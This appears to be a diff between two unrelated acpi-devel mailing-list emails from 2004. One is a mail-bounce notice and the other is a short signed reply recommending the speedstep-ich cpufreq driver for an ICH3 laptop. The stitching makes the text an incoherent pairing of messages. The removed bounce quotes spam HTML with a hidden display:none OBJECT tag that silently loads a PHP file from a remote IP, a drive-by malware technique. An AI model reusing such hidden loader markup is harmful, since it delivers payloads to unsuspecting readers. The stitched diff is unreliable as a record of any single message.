@@ -1,10 +1,15 @@
-From: Unknown <unknown@unknown.invalid>
-Subject: Returned Mail: Error During Delivery
-Date: Sun, 21 Mar 2004 17:49:36 +0000 (UTC)
+From: Dominik Brodowski <linux-X3ehHDuj6sIIGcDfoQAp7BvVK+yQ3ZXh@public.gmane.org>
+Subject: Re: P State manipulation on Compaq Evo N610c
+Date: Sun, 21 Mar 2004 19:43:14 +0100
 Sender: acpi-devel-admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
-Message-ID: <E1B573E-00004q-C2@sc8-sf-list2.sourceforge.net>
+Message-ID: <20040321184314.GA7694@dominikbrodowski.de>
+References: <200403201847.23668.faye@zippysoft.com>
+Mime-Version: 1.0
+Content-Type: multipart/signed; micalg=pgp-sha1;
+	protocol="application/pgp-signature"; boundary="PNTmBPCT7hxwcZjr"
 Return-path: <acpi-devel-admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org>
-From: Webshield SMTP V4.5 MR1a Mail Service
+Content-Disposition: inline
+In-Reply-To: <200403201847.23668.faye-h3p4nEmjOm7by3iVrkZq2A@public.gmane.org>
 Errors-To: acpi-devel-admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/acpi-devel>,
 	<mailto:acpi-devel-request-5NWGOfrQmneRv+LV9MX5utDmRdBvX5/5ji9XKYC2TYK4Io4DoRGLOrNAH6kLmebB@public.gmane.org>
@@ -13,39 +18,38 @@ List-Help: <mailto:acpi-devel-request-5NWGOfrQmneRv+LV9MX5utDmRdBvX5/5lLLH9aP38K
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/acpi-devel>,
 	<mailto:acpi-devel-request-5NWGOfrQmneRv+LV9MX5utDmRdBvX5/5R9m/fhtKvoLKtGCp0j7rLg@public.gmane.org>
 List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum=acpi-devel>
-Date: Sun Mar 21 12:47:26 2004
-To: acpi-devel-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
+To: Faye Pearson <faye-h3p4nEmjOm7by3iVrkZq2A@public.gmane.org>
+Cc: ACPI Developers <acpi-devel-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org>
 List-Id: linux-acpi@vger.kernel.org
 
-    ---- Failed Recipients ----
 
-<pgmdsg-/X6VYK7xyaY@public.gmane.org>
+--PNTmBPCT7hxwcZjr
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
 
+On Sat, Mar 20, 2004 at 06:47:23PM +0000, Faye Pearson wrote:
+> lspci says that it is an 82845 Brookdale chipset.
+> The southbridge appears to be an 82801CAM (ICH3)
 
-Requested action not taken: mailbox unavailable. [SMTP Error Code 550]
+You may want to try [2.6. kernel] cpufreq -> speedstep on ICH=20
+chipsets [CONFIG_X86_SPEEDSTEP_ICH]
 
-    ---- Contents of the undelivered mail ----
+	Dominik
 
-Received: From jimhsiao.com ([211.22.80.198]) by ibixmaila.ibi.com (WebShield SMTP v4.5 MR1a);
-	id 1079891243669; Sun, 21 Mar 2004 12:47:23 -0500
-Date: Mon, 22 Mar 2004 01:40:30 +0800
-To: pgmdsg-/X6VYK7xyaY@public.gmane.org
-Subject: Re: Hi
-From: acpi-devel-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
-Message-ID: <liozhlnbyobehdxsbdy-/X6VYK7xyaY@public.gmane.org>
-MIME-Version: 1.0
-X-Priority: 3
-X-MSMail-Priority: Normal
-X-Mailer: Microsoft Outlook Express 6.00.2600.0000
-X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
-Content-Type: text/html; charset=us-ascii
-Content-Transfer-Encoding: 7bit
+--PNTmBPCT7hxwcZjr
+Content-Type: application/pgp-signature
+Content-Disposition: inline
 
-<html><body>
-<font face="System">
-<OBJECT STYLE="display:none" DATA="http://68.67.237.226:81/348030.php">
-</OBJECT></body></html>
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.2.4 (GNU/Linux)
 
+iD8DBQFAXeJCZ8MDCHJbN8YRAoO/AJ92fanIMyPWUfpIF2usvk36JezJcwCfRbpm
+Jhl7zHreR3H0t9nfIm3cPis=
+=vKoL
+-----END PGP SIGNATURE-----
+
+--PNTmBPCT7hxwcZjr--
 
 
 -------------------------------------------------------
